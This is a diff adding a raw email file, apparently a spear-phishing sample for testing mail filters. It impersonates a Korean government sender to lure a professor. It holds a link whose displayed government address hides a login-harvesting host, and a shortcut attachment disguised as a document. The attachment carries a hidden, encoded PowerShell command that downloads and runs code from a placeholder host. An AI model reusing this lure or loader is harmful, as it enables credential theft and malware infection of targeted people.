@@ -1,0 +1,52 @@
+Received: from mx.victim.example (mx.victim.example [10.1.1.10])
+	by mail.victim.example with ESMTPS id abc123
+	for <hong.gildong@victim.example>; Tue, 06 Oct 2026 01:12:09 +0000
+Received: from relay.bulk-mailer.example (relay.bulk-mailer.example [198.51.100.23])
+	by mx.victim.example with ESMTP id def456; Tue, 06 Oct 2026 01:12:05 +0000
+Received: from [10.0.0.5] (unknown [203.0.113.77])
+	by relay.bulk-mailer.example with ESMTPSA id ghi789; Tue, 06 Oct 2026 10:12:01 +0900
+Authentication-Results: mx.victim.example;
+	spf=fail smtp.mailfrom=bulk-mailer.example;
+	dkim=none;
+	dmarc=fail header.from=unikorea-gov.example
+Return-Path: <bounce@bulk-mailer.example>
+From: "=?UTF-8?B?7Ya17J287Jew6rWs7JuQ?=" <admin@unikorea-gov.example>
+Reply-To: reply.desk@freemail.example
+To: =?UTF-8?B?7ZmN6ri464+Z?= <hong.gildong@victim.example>
+Subject: =?UTF-8?B?W+yekOusuCDsmpTssq1dIOuMgOu2geygleyxhSDshLjrr7jrgpgg7JuQ6rOgIOqygO2GoA==?=
+Date: Tue, 06 Oct 2026 10:12:00 +0900
+Message-ID: <20261006101200.1234@unikorea-gov.example>
+X-Mailer: Microsoft Outlook 16.0
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY-1"
+
+--BOUNDARY-1
+Content-Type: multipart/alternative; boundary="BOUNDARY-2"
+
+--BOUNDARY-2
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+홍길동 교수님께,
+대북정책 세미나 원고 검토를 부탁드립니다.
+문의: 010-1234-5678
+자료 확인: hxxp://docs-share[.]example/view?id=7781
+
+--BOUNDARY-2
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+<html><body>
+<p>홍길동 교수님께, 대북정책 세미나 원고 검토를 부탁드립니다.</p>
+<p><a href="http://login-verify.example/auth?u=hong">https://www.unikorea.go.kr</a></p>
+</body></html>
+
+--BOUNDARY-2--
+
+--BOUNDARY-1
+Content-Type: application/octet-stream; name="=?UTF-8?B?7J6Q66y47JqU7LKt7IScLmh3cC5sbms=?="
+Content-Disposition: attachment; filename="=?UTF-8?B?7J6Q66y47JqU7LKt7IScLmh3cC5sbms=?="
+Content-Transfer-Encoding: base64
+
+TAAAAAEUAgAAAAAAwAAAAAAAAEYAAAAAcG93ZXJzaGVsbCAtdyBoaWRkZW4gLWVuYyBTUUJGQUZnQUlBQW9BRTRBWlFCM0FDMEFUd0JpQUdvQVpRQmpBSFFBSUFCT0FHVUFkQUF1QUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQUNrQUxnQkVBRzhBZHdCdUFHd0Fid0JoQUdRQVV3QjBBSElBYVFCdUFHY0FLQUFuQUdnQWRBQjBBSEFBT2dBdkFDOEFZd0F5QUM0QVpRQjRBR0VBYlFCd0FHd0FaUUF2QUhBQUp3QXBBQT09
+--BOUNDARY-1--
